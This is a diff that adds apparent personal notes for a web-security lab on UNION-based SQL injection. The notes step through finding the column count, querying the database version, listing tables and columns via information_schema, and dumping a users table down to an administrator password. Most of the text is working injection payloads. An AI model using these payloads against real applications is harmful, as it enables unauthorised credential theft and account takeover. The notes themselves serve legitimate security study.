@@ -1,0 +1,61 @@
+Lab-9 - SQL Injection attack, listing the database contents on non-oracle databases
+
+END Goals:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns in that table
+- Output the contents of the table
+- Login as the administrator user
+
+Analysis:
+1. ' Order by 3-- error 
+So 2 columns
+------------------------------
+2. Find the type of the columns
+' UNION SELECT 'a', 'A'-- works
+so both are string type
+------------------------------
+3. Version of the database
+try with all the non oracle version queries
+Microsoft	SELECT @@version
+PostgreSQL	SELECT version() /this is 200 so working
+MySQL	SELECT @@version
+------------------------------
+4. List all the tables
+Here are all the queries
+Database contents
+You can list the tables that exist in the database, and the columns that those tables contain.
+
+Oracle	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Microsoft	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+PostgreSQL	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' /Use this
+
+MySQL	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+PostgreSQL	SELECT table_name,NULL FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' /Use this
+' UNION SELECT table_name,NULL FROM information_schema.tables-- From cheat sheet 
+Search with users in the Burp repeater
+
+Found: users_rdqsus
+------------------------------
+5. List all the columns in the users_rdqsus table
+
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_rdqsus'--
+
+username_vjyqgf
+password_lzorjv 
+------------------------------
+
+6. Output the usernames and passwords
+
+' UNION SELECT username_vjyqgf,password_lzorjv FROM users_rdqsus--
+
+administrator
+1bvplx622a19q681i2tt
